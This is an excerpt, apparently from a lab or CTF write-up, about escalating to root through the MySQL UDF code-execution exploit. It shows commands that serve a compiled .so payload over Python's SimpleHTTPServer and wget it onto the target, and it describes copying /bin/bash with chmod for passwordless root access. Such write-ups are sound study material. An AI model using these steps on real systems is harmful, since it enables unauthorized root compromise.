...
*MYSQL 4/5/6 - UDF for code execution written in C is the only thing that pops up, and it's a see exploit. All of the guides on running this exploit use a C compiler called `gcc`.*
...
*Testing that it compiled correctly on my host machine, giving me a payload with a ` .so ` extension that I was looking for,  I needed to transfer that specific payload from my machine to the target machine. since both machines are on the same network, I can use a python SimpleHTTPServer on my host machine to download it onto the target machine.*

  - Python Command: `python -m SimpleHTTPServer 80`
  - Target 2 Command: `wget 192.168.1.90/temp/1518.so`

*Now that this file is on the system, we can follow the*
https://atom.hackstreetboys.ph/linux-privilege-escalation-service-exploit/
*to insert the file into the system and run whatever code we see fit, here are all the lines you'll have to input after logging into MySQL, they will also be found on my writeups on my repository*

*we can copy a root user bash terminal by using the new code execution exploit we created as root, to copy `/bin/bash`, then use `chmod` to let non root users access the root terminal without passwords.*
